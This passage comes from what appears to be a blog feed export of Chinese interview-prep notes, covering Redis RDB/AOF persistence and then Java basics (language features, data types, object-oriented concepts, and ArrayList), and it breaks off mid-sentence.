bgsave 每次运行都要执行 fork 操作创建子进程，属于重量级操作，频繁执行成本过高。针对 RDB 不适合实时持久化的问题，Redis 提供了 AOF 持久化方式。</p><p>RDB 文件使用特定二进制格式保存，Redis 版本演进过程中有多个格式的 RDB 版本，存在老版本 Redis 服务无法兼容新版 RDB 格式的问题。</p><hr><h4 id="Q5：AOF-持久化的原理？"><a href="#Q5：AOF-持久化的原理？" class="headerlink" title="Q5：AOF 持久化的原理？"></a>Q5：AOF 持久化的原理？</h4><p>AOF 持久化以独立日志的方式记录每次写命令，重启时再重新执行 AOF 文件中的命令达到恢复数据的目的。AOF 的主要作用是解决了数据持久化的实时性，目前是 Redis 持久化的主流方式。</p><p>开启 AOF 功能需要设置：<code>appendonly yes</code>，默认不开启。保存路径同 RDB 方式一致，通过 dir 配置指定。</p><p>AOF 的工作流程操作：命令写入 append、文件同步 sync、文件重写 rewrite、重启加载 load：</p><ul><li>所有的写入命令会追加到 aof_buf 缓冲区中。</li><li>AOF 缓冲区根据对应的策略向硬盘做同步操作。</li><li>随着 AOF 文件越来越大，需要定期对 AOF 文件进行重写，达到压缩的目的。</li><li>当服务器重启时，可以加载 AOF 文件进行数据恢复。</li></ul><hr><h4 id="Q6：AOF-命令写入的原理？"><a href="#Q6：AOF-命令写入的原理？" class="headerlink" title="Q6：AOF 命令写入的原理？"></a>Q6：AOF 命令写入的原理？</h4><p>AOF 命令写入的内容直接是文本协议格式，采用文本协议格式的原因：</p><ul><li>文本协议具有很好的兼容性。</li><li>开启 AOF 后所有写入命令都包含追加操作，直接采用协议格式避免了二次处理开销。</li><li>文本协议具有可读性，方便直接修改和处理。</li></ul><p>AOF 把命令追加到缓冲区的原因：</p><p>Redis 使用单线程响应命令，如果每次写 AOF 文件命令都直接追加到硬盘，那么性能完全取决于当前硬盘负载。先写入缓冲区中还有另一个好处，Redis 可以提供多种缓冲区同步硬盘策略，在性能和安全性方面做出平衡。</p><hr><h4 id="Q7：AOF-文件同步的原理？"><a href="#Q7：AOF-文件同步的原理？" class="headerlink" title="Q7：AOF 文件同步的原理？"></a>Q7：AOF 文件同步的原理？</h4><p>Redis 提供了多种 AOF 缓冲区文件同步策略，由参数 <code>appendfsync</code> 控制，不同值的含义如下：</p><ul><li><p>always：命令写入缓冲区后调用系统 fsync 操作同步到 AOF 文件，fsync 完成后线程返回。每次写入都要同步 AOF，性能较低，不建议配置。</p></li><li><p>everysec：命令写入缓冲区后调用系统 write 操作，write 完成后线程返回。fsync 同步文件操作由专门线程每秒调用一次。是建议的策略，也是默认配置，兼顾性能和数据安全。</p></li><li><p>no：命令写入缓冲区后调用系统 write 操作，不对 AOF 文件做 fsync 同步，同步硬盘操作由操作系统负责，周期通常最长 30 秒。由于操作系统每次同步 AOF 文件的周期不可控，而且会加大每次同步硬盘的数据量，虽然提升了性能，但安全性无法保证。</p></li></ul><hr><h4 id="Q8：AOF-文件重写的原理？"><a href="#Q8：AOF-文件重写的原理？" class="headerlink" title="Q8：AOF 文件重写的原理？"></a>Q8：AOF 文件重写的原理？</h4><p>文件重写是把 Redis 进程内的数据转化为写命令同步到新 AOF 文件的过程，可以降低文件占用空间，更小的文件可以更快地被加载。</p><p>重写后 AOF 文件变小的原因：</p><ul><li>进程内已经超时的数据不再写入文件。</li><li>旧的 AOF 文件含有无效命令，重写使用进程内数据直接生成，这样新的 AOF 文件只保留最终数据写入命令。</li><li>多条写命令可以合并为一个，为了防止单条命令过大造成客户端缓冲区溢出，对于 list、set、hash、zset 等类型操作，以 64 个元素为界拆分为多条。</li></ul><p>AOF 重写分为手动触发和自动触发，手动触发直接调用 bgrewriteaof 命令，自动触发根据 <code>auto-aof-rewrite-min-size</code> 和  <code>auto-aof-rewrite-percentage</code> 参数确定自动触发时机。</p><p>重写流程：</p><p>① 执行 AOF 重写请求，如果当前进程正在执行 AOF 重写，请求不执行并返回，如果当前进程正在执行 bgsave 操作，重写命令延迟到 bgsave 完成之后再执行。</p><p>② 父进程执行 fork 创建子进程，开销等同于 bgsave 过程。</p><p>③ 父进程 fork 操作完成后继续响应其他命令，所有修改命令依然写入 AOF 缓冲区并同步到硬盘，保证原有 AOF 机制正确性。</p><p>④ 子进程根据内存快照，按命令合并规则写入到新的 AOF 文件。每次批量写入数据量默认为 32 MB，防止单次刷盘数据过多造成阻塞。</p><p>⑤ 新 AOF 文件写入完成后，子进程发送信号给父进程，父进程更新统计信息。</p><p>⑥ 父进程把 AOF 重写缓冲区的数据写入到新的 AOF 文件并替换旧文件，完成重写。</p><hr><h4 id="Q9：AOF-重启加载的原理？"><a href="#Q9：AOF-重启加载的原理？" class="headerlink" title="Q9：AOF 重启加载的原理？"></a>Q9：AOF 重启加载的原理？</h4><p>AOF 和 RDB 文件都可以用于服务器重启时的数据恢复。Redis 持久化文件的加载流程：</p><p>① AOF 持久化开启且存在 AOF 文件时，优先加载 AOF 文件。</p><p>② AOF 关闭时且存在 RDB 文件时，记载 RDB 文件。</p><p>③ 加载 AOF&#x2F;RDB 文件成功后，Redis 启动成功。</p><p>④ AOF&#x2F;RDB 文件存在错误导致加载失败时，Redis 启动失败并打印错误信息。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础面试题</title>
      <link href="/posts/932b/"/>
      <url>/posts/932b/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-基础-40"><a href="#Java-基础-40" class="headerlink" title="Java 基础 40"></a>Java 基础 40</h2><h3 id="语言特性-12"><a href="#语言特性-12" class="headerlink" title="语言特性 12"></a>语言特性 12</h3><h4 id="Q1：Java-语言的优点？"><a href="#Q1：Java-语言的优点？" class="headerlink" title="Q1：Java 语言的优点？"></a>Q1：Java 语言的优点？</h4><p>① 平台无关性，摆脱硬件束缚，”一次编写，到处运行”。</p><p>② 相对安全的内存管理和访问机制，避免大部分内存泄漏和指针越界。</p><p>③ 热点代码检测和运行时编译及优化，使程序随运行时间增长获得更高性能。</p><p>④ 完善的应用程序接口，支持第三方类库。</p><hr><h4 id="Q2：Java-如何实现平台无关？"><a href="#Q2：Java-如何实现平台无关？" class="headerlink" title="Q2：Java 如何实现平台无关？"></a>Q2：Java 如何实现平台无关？</h4><p><strong>JVM：</strong> Java 编译器可生成与计算机体系结构无关的字节码指令，字节码文件不仅可以轻易地在任何机器上解释执行，还可以动态地转换成本地机器代码，转换是由 JVM 实现的，JVM 是平台相关的，屏蔽了不同操作系统的差异。</p><p><strong>语言规范：</strong> 基本数据类型大小有明确规定，例如 int 永远为 32 位，而 C&#x2F;C++ 中可能是 16 位、32 位，也可能是编译器开发商指定的其他大小。Java 中数值类型有固定字节数，二进制数据以固定格式存储和传输，字符串采用标准的 Unicode 格式存储。</p><hr><h4 id="Q3：JDK-和-JRE-的区别？"><a href="#Q3：JDK-和-JRE-的区别？" class="headerlink" title="Q3：JDK 和 JRE 的区别？"></a>Q3：JDK 和 JRE 的区别？</h4><p><strong>JDK：</strong> Java Development Kit，开发工具包。提供了编译运行 Java 程序的各种工具，包括编译器、JRE 及常用类库，是 JAVA 核心。</p><p><strong>JRE：</strong> Java Runtime Environment，运行时环境，运行 Java 程序的必要环境，包括 JVM、核心类库、核心配置工具。</p><hr><h4 id="Q4：Java-按值调用还是引用调用？"><a href="#Q4：Java-按值调用还是引用调用？" class="headerlink" title="Q4：Java 按值调用还是引用调用？"></a>Q4：Java 按值调用还是引用调用？</h4><p><strong>按值调用</strong>指方法接收调用者提供的值，<strong>按引用调用</strong>指方法接收调用者提供的变量地址。</p><p>Java 总是按值调用，方法得到的是所有参数值的副本，传递对象时实际上方法接收的是对象引用的副本。方法不能修改基本数据类型的参数，如果传递了一个 int 值 ，改变值不会影响实参，因为改变的是值的一个副本。</p><p>可以改变对象参数的状态，但不能让对象参数引用一个新的对象。如果传递了一个 int 数组，改变数组的内容会影响实参，而改变这个参数的引用并不会让实参引用新的数组对象。</p><hr><h4 id="Q5：浅拷贝和深拷贝的区别？"><a href="#Q5：浅拷贝和深拷贝的区别？" class="headerlink" title="Q5：浅拷贝和深拷贝的区别？"></a>Q5：浅拷贝和深拷贝的区别？</h4><p><strong>浅拷贝：</strong> 只复制当前对象的基本数据类型及引用变量，没有复制引用变量指向的实际对象。修改克隆对象可能影响原对象，不安全。</p><p><strong>深拷贝：</strong> 完全拷贝基本数据类型和引用数据类型，安全。</p><hr><h4 id="Q6：什么是反射？"><a href="#Q6：什么是反射？" class="headerlink" title="Q6：什么是反射？"></a>Q6：什么是反射？</h4><p>在运行状态中，对于任意一个类都能知道它的所有属性和方法，对于任意一个对象都能调用它的任意方法和属性，这种动态获取信息及调用对象方法的功能称为反射。缺点是破坏了封装性以及泛型约束。反射是框架的核心，Spring 大量使用反射。</p><hr><h4 id="Q7：Class-类的作用？如何获取一个-Class-对象？"><a href="#Q7：Class-类的作用？如何获取一个-Class-对象？" class="headerlink" title="Q7：Class 类的作用？如何获取一个 Class 对象？"></a>Q7：Class 类的作用？如何获取一个 Class 对象？</h4><p>在程序运行期间，Java 运行时系统为所有对象维护一个运行时类型标识，这个信息会跟踪每个对象所属的类，虚拟机利用运行时类型信息选择要执行的正确方法，保存这些信息的类就是 Class，这是一个泛型类。</p><p>获取 Class 对象：①  <code>类名.class</code> 。②对象的 <code>getClass</code>方法。③ <code>Class.forName(类的全限定名)</code>。</p><hr><h4 id="Q8：什么是注解？什么是元注解？"><a href="#Q8：什么是注解？什么是元注解？" class="headerlink" title="Q8：什么是注解？什么是元注解？"></a>Q8：什么是注解？什么是元注解？</h4><p><strong>注解</strong>是一种标记，使类或接口附加额外信息，帮助编译器和 JVM 完成一些特定功能，例如 <code>@Override</code> 标识一个方法是重写方法。</p><p><strong>元注解</strong>是自定义注解的注解，例如：</p><p><code>@Target</code>：约束作用位置，值是 ElementType 枚举常量，包括 METHOD 方法、VARIABLE 变量、TYPE 类&#x2F;接口、PARAMETER 方法参数、CONSTRUCTORS 构造方法和 LOACL_VARIABLE 局部变量等。</p><p><code>@Rentention</code>：约束生命周期，值是 RetentionPolicy 枚举常量，包括 SOURCE 源码、CLASS 字节码和 RUNTIME 运行时。</p><p><code>@Documented</code>：表明这个注解应该被 javadoc 记录。</p><hr><h4 id="Q9：什么是泛型，有什么作用？"><a href="#Q9：什么是泛型，有什么作用？" class="headerlink" title="Q9：什么是泛型，有什么作用？"></a>Q9：什么是泛型，有什么作用？</h4><p><strong>泛型</strong>本质是参数化类型，解决不确定对象具体类型的问题。泛型在定义处只具备执行 Object 方法的能力。</p><p>泛型的好处：① 类型安全，放置什么出来就是什么，不存在 ClassCastException。② 提升可读性，编码阶段就显式知道泛型集合、泛型方法等处理的对象类型。③ 代码重用，合并了同类型的处理代码。</p><h4 id="Q10：泛型擦除是什么？"><a href="#Q10：泛型擦除是什么？" class="headerlink" title="Q10：泛型擦除是什么？"></a>Q10：泛型擦除是什么？</h4><p>泛型用于编译阶段，编译后的字节码文件不包含泛型类型信息，因为虚拟机没有泛型类型对象，所有对象都属于普通类。例如定义 <code>List&lt;Object&gt;</code> 或 <code>List&lt;String&gt;</code>，在编译后都会变成 <code>List</code> 。</p><p>定义一个泛型类型，会自动提供一个对应原始类型，类型变量会被擦除。如果没有限定类型就会替换为 Object，如果有限定类型就会替换为第一个限定类型，例如 <code>&lt;T extends A &amp; B&gt;</code> 会使用 A 类型替换 T。</p><hr><h4 id="Q11：JDK8-新特性有哪些？"><a href="#Q11：JDK8-新特性有哪些？" class="headerlink" title="Q11：JDK8 新特性有哪些？"></a>Q11：JDK8 新特性有哪些？</h4><p><strong>lambda 表达式：</strong>允许把函数作为参数传递到方法，简化匿名内部类代码。</p><p><strong>函数式接口：</strong>使用 <code>@FunctionalInterface</code> 标识，有且仅有一个抽象方法，可被隐式转换为 lambda 表达式。</p><p><strong>方法引用：</strong>可以引用已有类或对象的方法和构造方法，进一步简化 lambda 表达式。</p><p><strong>接口：</strong>接口可以定义 <code>default </code> 修饰的默认方法，降低了接口升级的复杂性，还可以定义静态方法。</p><p><strong>注解：</strong>引入重复注解机制，相同注解在同地方可以声明多次。注解作用范围也进行了扩展，可作用于局部变量、泛型、方法异常等。</p><p><strong>类型推测：</strong>加强了类型推测机制，使代码更加简洁。</p><p><strong>Optional 类：</strong>处理空指针异常，提高代码可读性。</p><p><strong>Stream 类：</strong>引入函数式编程风格，提供了很多功能，使代码更加简洁。方法包括 <code>forEach</code> 遍历、<code>count</code> 统计个数、<code>filter</code> 按条件过滤、<code>limit</code> 取前 n 个元素、<code>skip</code> 跳过前 n 个元素、<code>map</code> 映射加工、<code>concat</code> 合并 stream 流等。</p><p><strong>日期：</strong>增强了日期和时间 API，新的 java.time 包主要包含了处理日期、时间、日期&#x2F;时间、时区、时刻和时钟等操作。</p><p><strong>JavaScript：</strong>提供了一个新的 JavaScript 引擎，允许在 JVM上运行特定 JavaScript 应用。</p><hr><h4 id="Q12：异常有哪些分类？"><a href="#Q12：异常有哪些分类？" class="headerlink" title="Q12：异常有哪些分类？"></a>Q12：异常有哪些分类？</h4><p>所有异常都是 Throwable 的子类，分为 Error 和 Exception。<strong>Error</strong> 是 Java 运行时系统的内部错误和资源耗尽错误，例如 StackOverFlowError 和 OutOfMemoryError，这种异常程序无法处理。</p><p><strong>Exception</strong> 分为受检异常和非受检异常，受检异常需要在代码中显式处理，否则会编译出错，非受检异常是运行时异常，继承自 RuntimeException。</p><p><strong>受检异常</strong>：① 无能为力型，如字段超长导致的 SQLException。② 力所能及型，如未授权异常 UnAuthorizedException，程序可跳转权限申请页面。常见受检异常还有 FileNotFoundException、ClassNotFoundException、IOException等。</p><p><strong>非受检异常</strong>：① 可预测异常，例如 IndexOutOfBoundsException、NullPointerException、ClassCastException 等，这类异常应该提前处理。② 需捕捉异常，例如进行 RPC 调用时的远程服务超时，这类异常客户端必须显式处理。③ 可透出异常，指框架或系统产生的且会自行处理的异常，例如 Spring 的 NoSuchRequestHandingMethodException，Spring 会自动完成异常处理，将异常自动映射到合适的状态码。</p><hr><h3 id="数据类型-5"><a href="#数据类型-5" class="headerlink" title="数据类型 5"></a>数据类型 5</h3><h4 id="Q1：Java-有哪些基本数据类型？"><a href="#Q1：Java-有哪些基本数据类型？" class="headerlink" title="Q1：Java 有哪些基本数据类型？"></a>Q1：Java 有哪些基本数据类型？</h4><table><thead><tr><th>数据类型</th><th>内存大小</th><th>默认值</th><th>取值范围</th></tr></thead><tbody><tr><td>byte</td><td>1 B</td><td>(byte)0</td><td>-128 ~ 127</td></tr><tr><td>short</td><td>2 B</td><td>(short)0</td><td>-2^15^ ~ 2^15^-1</td></tr><tr><td>int</td><td>4 B</td><td>0</td><td>-2^31^ ~ 2^31^-1</td></tr><tr><td>long</td><td>8 B</td><td>0L</td><td>-2^63^ ~ 2^63^-1</td></tr><tr><td>float</td><td>4 B</td><td>0.0F</td><td>±3.4E+38（有效位数 6~7 位）</td></tr><tr><td>double</td><td>8 B</td><td>0.0D</td><td>±1.7E+308（有效位数 15 位）</td></tr><tr><td>char</td><td>英文 1B，中文 UTF-8 占 3B，GBK 占 2B。</td><td>‘\u0000’</td><td>‘\u0000’ ~ ‘\uFFFF’</td></tr><tr><td>boolean</td><td>单个变量 4B &#x2F; 数组 1B</td><td>false</td><td>true、false</td></tr></tbody></table><p>JVM 没有 boolean 赋值的专用字节码指令，<code>boolean f = false</code> 就是使用 ICONST_0 即常数 0 赋值。单个 boolean 变量用 int 代替，boolean 数组会编码成 byte 数组。</p><hr><h4 id="Q2：自动装箱-拆箱是什么？"><a href="#Q2：自动装箱-拆箱是什么？" class="headerlink" title="Q2：自动装箱&#x2F;拆箱是什么？"></a>Q2：自动装箱&#x2F;拆箱是什么？</h4><p>每个基本数据类型都对应一个包装类，除了 int 和 char 对应 Integer 和 Character 外，其余基本数据类型的包装类都是首字母大写即可。</p><p><strong>自动装箱：</strong> 将基本数据类型包装为一个包装类对象，例如向一个泛型为 Integer 的集合添加 int 元素。</p><p><strong>自动拆箱：</strong> 将一个包装类对象转换为一个基本数据类型，例如将一个包装类对象赋值给一个基本数据类型的变量。</p><p>比较两个包装类数值要用 <code>equals</code> ，而不能用 <code>==</code> 。</p><hr><h4 id="Q3：String-是不可变类为什么值可以修改？"><a href="#Q3：String-是不可变类为什么值可以修改？" class="headerlink" title="Q3：String 是不可变类为什么值可以修改？"></a>Q3：String 是不可变类为什么值可以修改？</h4><p>String 类和其存储数据的成员变量 value 字节数组都是 final 修饰的。对一个 String 对象的任何修改实际上都是创建一个新 String 对象，再引用该对象。只是修改 String 变量引用的对象，没有修改原 String 对象的内容。</p><hr><h4 id="Q4：字符串拼接的方式有哪些？"><a href="#Q4：字符串拼接的方式有哪些？" class="headerlink" title="Q4：字符串拼接的方式有哪些？"></a>Q4：字符串拼接的方式有哪些？</h4><p>① 直接用 <code>+</code> ，底层用 StringBuilder 实现。只适用小数量，如果在循环中使用 <code>+</code> 拼接，相当于不断创建新的 StringBuilder 对象再转换成 String 对象，效率极差。</p><p>② 使用 String 的 concat 方法，该方法中使用 <code>Arrays.copyOf</code> 创建一个新的字符数组 buf 并将当前字符串 value 数组的值拷贝到 buf 中，buf 长度 &#x3D; 当前字符串长度 + 拼接字符串长度。之后调用 <code>getChars</code> 方法使用 <code>System.arraycopy</code> 将拼接字符串的值也拷贝到 buf 数组，最后用 buf 作为构造参数 new 一个新的 String 对象返回。效率稍高于直接使用 <code>+</code>。</p><p>③ 使用 StringBuilder 或 StringBuffer，两者的 <code>append</code> 方法都继承自 AbstractStringBuilder，该方法首先使用 <code>Arrays.copyOf</code>  确定新的字符数组容量，再调用 <code>getChars</code> 方法使用 <code>System.arraycopy</code> 将新的值追加到数组中。StringBuilder 是 JDK5 引入的，效率高但线程不安全。StringBuffer 使用 synchronized 保证线程安全。</p><hr><h4 id="Q5：String-a-“a”-new-String-“b”-创建了几个对象？"><a href="#Q5：String-a-“a”-new-String-“b”-创建了几个对象？" class="headerlink" title="Q5：String a &#x3D; “a” + new String(“b”)  创建了几个对象？"></a>Q5：String a &#x3D; “a” + new String(“b”)  创建了几个对象？</h4><p>常量和常量拼接仍是常量，结果在常量池，只要有变量参与拼接结果就是变量，存在堆。</p><p>使用字面量时只创建一个常量池中的常量，使用 new 时如果常量池中没有该值就会在常量池中新创建，再在堆中创建一个对象引用常量池中常量。因此 <code>String a = &quot;a&quot; + new String(&quot;b&quot;) </code> 会创建四个对象，常量池中的 a 和 b，堆中的 b 和堆中的 ab。</p><hr><h3 id="面向对象-10"><a href="#面向对象-10" class="headerlink" title="面向对象 10"></a>面向对象 10</h3><h4 id="Q1：谈一谈你对面向对象的理解"><a href="#Q1：谈一谈你对面向对象的理解" class="headerlink" title="Q1：谈一谈你对面向对象的理解"></a>Q1：谈一谈你对面向对象的理解</h4><p>面向过程让计算机有步骤地顺序做一件事，是过程化思维，使用面向过程语言开发大型项目，软件复用和维护存在很大问题，模块之间耦合严重。面向对象相对面向过程更适合解决规模较大的问题，可以拆解问题复杂度，对现实事物进行抽象并映射为开发对象，更接近人的思维。</p><p>例如开门这个动作，面向过程是 <code>open(Door door)</code>，动宾结构，door 作为操作对象的参数传入方法，方法内定义开门的具体步骤。面向对象的方式首先会定义一个类 Door，抽象出门的属性（如尺寸、颜色）和行为（如 open 和 close），主谓结构。</p><p>面向过程代码松散，强调流程化解决问题。面向对象代码强调高内聚、低耦合，先抽象模型定义共性行为，再解决实际问题。</p><hr><h4 id="Q2：面向对象的三大特性？"><a href="#Q2：面向对象的三大特性？" class="headerlink" title="Q2：面向对象的三大特性？"></a>Q2：面向对象的三大特性？</h4><p><strong>封装</strong>是对象功能内聚的表现形式，在抽象基础上决定信息是否公开及公开等级，核心问题是以什么方式暴漏哪些信息。主要任务是对属性、数据、敏感行为实现隐藏，对属性的访问和修改必须通过公共接口实现。封装使对象关系变得简单，降低了代码耦合度，方便维护。</p><p>迪米特原则就是对封装的要求，即 A 模块使用 B 模块的某接口行为，对 B 模块中除此行为外的其他信息知道得应尽可能少。不直接对 public 属性进行读取和修改而使用 getter&#x2F;setter 方法是因为假设想在修改属性时进行权限控制、日志记录等操作，在直接访问属性的情况下无法实现。如果将 public 的属性和行为修改为 private 一般依赖模块都会报错，因此不知道使用哪种权限时应优先使用 private。</p><p><strong>继承</strong>用来扩展一个类，子类可继承父类的部分属性和行为使模块具有复用性。继承是”is-a”关系，可使用里氏替换原则判断是否满足”is-a”关系，即任何父类出现的地方子类都可以出现。如果父类引用直接使用子类引用来代替且可以正确编译并执行，输出结果符合子类场景预期，那么说明两个类符合里氏替换原则。</p><p><strong>多态</strong>以封装和继承为基础，根据运行时对象实际类型使同一行为具有不同表现形式。多态指在编译层面无法确定最终调用的方法体，在运行期由 JVM 动态绑定，调用合适的重写方法。由于重载属于静态绑定，本质上重载结果是完全不同的方法，因此多态一般专指重写。</p><hr><h4 id="Q3：重载和重写的区别？"><a href="#Q3：重载和重写的区别？" class="headerlink" title="Q3：重载和重写的区别？"></a>Q3：重载和重写的区别？</h4><p><strong>重载</strong>指方法名称相同，但参数类型个数不同，是行为水平方向不同实现。对编译器来说，方法名称和参数列表组成了一个唯一键，称为方法签名，JVM 通过方法签名决定调用哪种重载方法。不管继承关系如何复杂，重载在编译时可以根据规则知道调用哪种目标方法，因此属于静态绑定。</p><p>JVM 在重载方法中选择合适方法的顺序：① 精确匹配。② 基本数据类型自动转换成更大表示范围。③ 自动拆箱与装箱。④ 子类向上转型。⑤ 可变参数。</p><p><strong>重写</strong>指子类实现接口或继承父类时，保持方法签名完全相同，实现不同方法体，是行为垂直方向不同实现。</p><p>元空间有一个方法表保存方法信息，如果子类重写了父类的方法，则方法表中的方法引用会指向子类实现。父类引用执行子类方法时无法调用子类存在而父类不存在的方法。</p><p>重写方法访问权限不能变小，返回类型和抛出的异常类型不能变大，必须加 <code>@Override</code> 。</p><hr><h4 id="Q4：类之间有哪些关系？"><a href="#Q4：类之间有哪些关系？" class="headerlink" title="Q4：类之间有哪些关系？"></a>Q4：类之间有哪些关系？</h4><table><thead><tr><th>类关系</th><th>描述</th><th>权力强侧</th><th>举例</th></tr></thead><tbody><tr><td>继承</td><td>父子类之间的关系：is-a</td><td>父类</td><td>小狗继承于动物</td></tr><tr><td>实现</td><td>接口和实现类之间的关系：can-do</td><td>接口</td><td>小狗实现了狗叫接口</td></tr><tr><td>组合</td><td>比聚合更强的关系：contains-a</td><td>整体</td><td>头是身体的一部分</td></tr><tr><td>聚合</td><td>暂时组装的关系：has-a</td><td>组装方</td><td>小狗和绳子是暂时的聚合关系</td></tr><tr><td>依赖</td><td>一个类用到另一个：depends-a</td><td>被依赖方</td><td>人养小狗，人依赖于小狗</td></tr><tr><td>关联</td><td>平等的使用关系：links-a</td><td>平等</td><td>人使用卡消费，卡可以提取人的信息</td></tr></tbody></table><hr><h4 id="Q5：Object-类有哪些方法？"><a href="#Q5：Object-类有哪些方法？" class="headerlink" title="Q5：Object 类有哪些方法？"></a>Q5：Object 类有哪些方法？</h4><p><strong>equals：</strong>检测对象是否相等，默认使用 <code>==</code> 比较对象引用，可以重写 equals 方法自定义比较规则。equals 方法规范：自反性、对称性、传递性、一致性、对于任何非空引用 x，<code>x.equals(null)</code>  返回 false。</p><p><strong>hashCode：</strong>散列码是由对象导出的一个整型值，没有规律，每个对象都有默认散列码，值由对象存储地址得出。字符串散列码由内容导出，值可能相同。为了在集合中正确使用，一般需要同时重写 equals 和 hashCode，要求 equals 相同 hashCode 必须相同，hashCode 相同 equals 未必相同，因此 hashCode 是对象相等的必要不充分条件。</p><p><strong>toString</strong>：打印对象时默认的方法，如果没有重写打印的是表示对象值的一个字符串。</p><p><strong>clone：</strong>clone 方法声明为 protected，类只能通过该方法克隆它自己的对象，如果希望其他类也能调用该方法必须定义该方法为 public。如果一个对象的类没有实现 Cloneable 接口，该对象调用 clone 方法会抛出一个 CloneNotSupport 异常。默认的 clone 方法是浅拷贝，一般重写 clone 方法需要实现 Cloneable 接口并指定访问修饰符为 public。</p><p><strong>finalize：</strong>确定一个对象死亡至少要经过两次标记，如果对象在可达性分析后发现没有与 GC Roots 连接的引用链会被第一次标记，随后进行一次筛选，条件是对象是否有必要执行 finalize 方法。假如对象没有重写该方法或方法已被虚拟机调用，都视为没有必要执行。如果有必要执行，对象会被放置在 F-Queue 队列，由一条低调度优先级的 Finalizer 线程去执行。虚拟机会触发该方法但不保证会结束，这是为了防止某个对象的 finalize 方法执行缓慢或发生死循环。只要对象在 finalize 方法中重新与引用链上的对象建立关联就会在第二次标记时被移出回收集合。由于运行代价高昂且无法保证调用顺序，在 JDK 9 被标记为过时方法，并不适合释放资源。</p><p><strong>getClass：</strong>返回包含对象信息的类对象。</p><p><strong>wait &#x2F; notify &#x2F; notifyAll：</strong>阻塞或唤醒持有该对象锁的线程。</p><hr><h4 id="Q6：内部类的作用是什么，有哪些分类？"><a href="#Q6：内部类的作用是什么，有哪些分类？" class="headerlink" title="Q6：内部类的作用是什么，有哪些分类？"></a>Q6：内部类的作用是什么，有哪些分类？</h4><p>内部类可对同一包中其他类隐藏，内部类方法可以访问定义这个内部类的作用域中的数据，包括 private 数据。</p><p>内部类是一个编译器现象，与虚拟机无关。编译器会把内部类转换成常规的类文件，用 $ 分隔外部类名与内部类名，其中匿名内部类使用数字编号，虚拟机对此一无所知。</p><p><strong>静态内部类：</strong> 属于外部类，只加载一次。作用域仅在包内，可通过 <code>外部类名.内部类名</code> 直接访问，类内只能访问外部类所有静态属性和方法。HashMap 的 Node 节点，ReentrantLock 中的 Sync 类，ArrayList 的 SubList 都是静态内部类。内部类中还可以定义内部类，如 ThreadLoacl 静态内部类 ThreadLoaclMap 中定义了内部类 Entry。</p><p><strong>成员内部类：</strong> 属于外部类的每个对象，随对象一起加载。不可以定义静态成员和方法，可访问外部类的所有内容。</p><p><strong>局部内部类：</strong> 定义在方法内，不能声明访问修饰符，只能定义实例成员变量和实例方法，作用范围仅在声明类的代码块中。</p><p><strong>匿名内部类：</strong> 只用一次的没有名字的类，可以简化代码，创建的对象类型相当于 new 的类的子类类型。用于实现事件监听和其他回调。</p><hr><h4 id="Q7：访问权限控制符有哪些？"><a href="#Q7：访问权限控制符有哪些？" class="headerlink" title="Q7：访问权限控制符有哪些？"></a>Q7：访问权限控制符有哪些？</h4><table><thead><tr><th>访问权限控制符</th><th>本类</th><th>包内</th><th>包外子类</th><th>任何地方</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>无</td><td>√</td><td>√</td><td>×</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr></tbody></table><hr><h4 id="Q8：接口和抽象类的异同？"><a href="#Q8：接口和抽象类的异同？" class="headerlink" title="Q8：接口和抽象类的异同？"></a>Q8：接口和抽象类的异同？</h4><p>接口和抽象类对实体类进行更高层次的抽象，仅定义公共行为和特征。</p><table><thead><tr><th>语法维度</th><th>抽象类</th><th>接口</th></tr></thead><tbody><tr><td>成员变量</td><td>无特殊要求</td><td>默认 public static final 常量</td></tr><tr><td>构造方法</td><td>有构造方法，不能实例化</td><td>没有构造方法，不能实例化</td></tr><tr><td>方法</td><td>抽象类可以没有抽象方法，但有抽象方法一定是抽象类。</td><td>默认 public abstract，JDK8 支持默认&#x2F;静态方法，JDK9 支持私有方法。</td></tr><tr><td>继承</td><td>单继承</td><td>多继承</td></tr></tbody></table><hr><h4 id="Q9：接口和抽象类应该怎么选择？"><a href="#Q9：接口和抽象类应该怎么选择？" class="headerlink" title="Q9：接口和抽象类应该怎么选择？"></a>Q9：接口和抽象类应该怎么选择？</h4><p>抽象类体现 is-a 关系，接口体现 can-do 关系。与接口相比，抽象类通常是对同类事物相对具体的抽象。</p><p>抽象类是模板式设计，包含一组具体特征，例如某汽车，底盘、控制电路等是抽象出来的共同特征，但内饰、显示屏、座椅材质可以根据不同级别配置存在不同实现。</p><p>接口是契约式设计，是开放的，定义了方法名、参数、返回值、抛出的异常类型，谁都可以实现它，但必须遵守接口的约定。例如所有车辆都必须实现刹车这种强制规范。</p><p>接口是顶级类，抽象类在接口下面的第二层，对接口进行了组合，然后实现部分接口。当纠结定义接口和抽象类时，推荐定义为接口，遵循接口隔离原则，按维度划分成多个接口，再利用抽象类去实现这些，方便后续的扩展和重构。</p><p>例如 Plane 和 Bird 都有 fly 方法，应把 fly 定义为接口，而不是抽象类的抽象方法再继承，因为除了 fly 行为外 Plane 和 Bird 间很难再找到其他共同特征。</p><hr><h4 id="Q10：子类初始化的顺序"><a href="#Q10：子类初始化的顺序" class="headerlink" title="Q10：子类初始化的顺序"></a>Q10：子类初始化的顺序</h4><p>① 父类静态代码块和静态变量。② 子类静态代码块和静态变量。③ 父类普通代码块和普通变量。④ 父类构造方法。⑤ 子类普通代码块和普通变量。⑥ 子类构造方法。</p><hr><h3 id="集合-7"><a href="#集合-7" class="headerlink" title="集合 7"></a>集合 7</h3><h4 id="Q1：说一说-ArrayList"><a href="#Q1：说一说-ArrayList" class="headerlink" title="Q1：说一说 ArrayList"></a>Q1：说一说 ArrayList</h4><p><strong>ArrayList</strong> 是容量可变的非线程安全列表，使用数组实现，集合扩容时会创建更大的数组，把原有数组复制到新数组。支持对元素的快速随机访问，但插入与删除速度很慢。ArrayList 实现了 RandomAcess 标记接口，如果一个类实现了该接口，那么表示使用索引遍历比迭代器更快。</p><p><strong>elementData</strong>是 ArrayList 的数据域，被 transient 修饰，序列化时会调用 writeObject 写入流，反序列化时调用 readObject 重新赋值到新对象的 elementData。原因是 elementData 